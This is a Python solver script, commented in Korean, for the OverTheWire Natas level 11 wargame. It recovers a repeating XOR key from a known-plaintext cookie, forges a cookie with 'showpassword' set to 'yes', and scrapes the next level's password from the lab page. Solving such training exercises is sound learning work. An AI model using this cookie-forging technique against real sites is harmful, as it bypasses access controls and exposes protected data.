import json
import requests
import base64
from bs4 import BeautifulSoup 
from urllib.parse import unquote
from itertools import cycle

url = "http://natas11.natas.labs.overthewire.org/"
# 현재 초기 쿠키값
enc_cookie = 'EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'
natas11_cred = "여기에 나타스 본인이 구한 11레벨의 비밀번호 입력"

sess = requests.Session()
sess.auth = ("natas11", natas11_cred)


text_str = {"showpassword":"no", "bgcolor":"#ffffff"}

# 복호화하여 xor_key값 추출
def dec_value(enc_cookie):
  # 웹 인코딩으로 인한 기호로 인식하는 부분 수정
  clean_cookie = unquote(enc_cookie)      
  
  #base64로 디코딩 
  base_dec_value = base64.b64decode(clean_cookie)
  plain_text = json.dumps(text_str, separators=(",", ":"))
  
  #xor key값을 구하기 위해 xor 연산(xor 연산은 암호화된 문자열 ^ key값 = 평문 성질이 있다)
  xor_dec_char = []
  for p_char, b_byte in zip(plain_text, base_dec_value):
    xor_dec_char.append(ord(p_char) ^ b_byte)

  # 현재 값의 형태가 xor 연산을 위해 숫자이기 때문에, 아래와 같이 chr을 이용하여 문자열로 변환하여 저장   
  xor_key = "".join(chr(num) for num in xor_dec_char)
  return xor_key

xor_key_value = dec_value(enc_cookie)

# 조건을 통과하기 위한 문자열을 인코딩 
input_text = {"showpassword":"yes", "bgcolor":"#ffffff"}

#조건을 만족하는 데이터값을 인코딩으로 변형해줄 함수 
def enc_value(input_text, xor_key_value):
  json_enc = json.dumps(input_text, separators=(",", ":"))
  
  real_slice_key = xor_key_value[:4]
  
  key_cycle = cycle(real_slice_key)
  
  xor_enc = []
  for char in json_enc:
    key_char = next(key_cycle)
    # xor 연산은 숫자끼리만 가능하기 때문에, ord를 통해 문자열 -> 숫자로 변경하여 연산  
    xor_result = ord(char) ^ ord(key_char)      
    xor_enc.append(xor_result)
  
  flag_cookie = base64.b64encode(bytes(xor_enc))
  return flag_cookie

enc_cookie = enc_value(input_text, xor_key_value)

# 인코딩 키값 출력, 여기서 만약 수동으로 개발자 도구가서 data의 쿠키값을 직접 입력해도 상관없으면 여기까지 해도 좋음
print(f"[*]xor_key값 ==> {xor_key_value}")
print(f"[*]입력할 인코딩 key값 ==> {enc_cookie}")

# 현재 바이트값이라 사전 형태의 쿠키에는 대입이 안되므로 벼환
if isinstance(enc_cookie, bytes):
  enc_cookie = enc_cookie.decode()
  
payload = {"data": enc_cookie}
response = sess.get(url, cookies=payload)

# response.text를 하게되면 html을 전부 불러오기 때문에, beautifulSoup 모듈로 포멧에 맞게 파싱해서 원하는 값만 출력
soup = BeautifulSoup(response.text, "html.parser")

# 페이지에 태그에 있는 text값을 전부 줄바꿈과 함께 문자열 저장
page_text = soup.get_text()

# 줄바꿈(\n) 문자를 기준으로 line에 배열로 저장하고 거기서 line에 있는 것 중 해당 문장열을 포함해야 비밀번호가 있기 때문에, 아래와 같이 작성
for line in page_text.split("\n"):
  if "The password for natas12 is" in line:
    print(f"[+]비밀번호를 찾았습니다: {line.strip()}")
    break
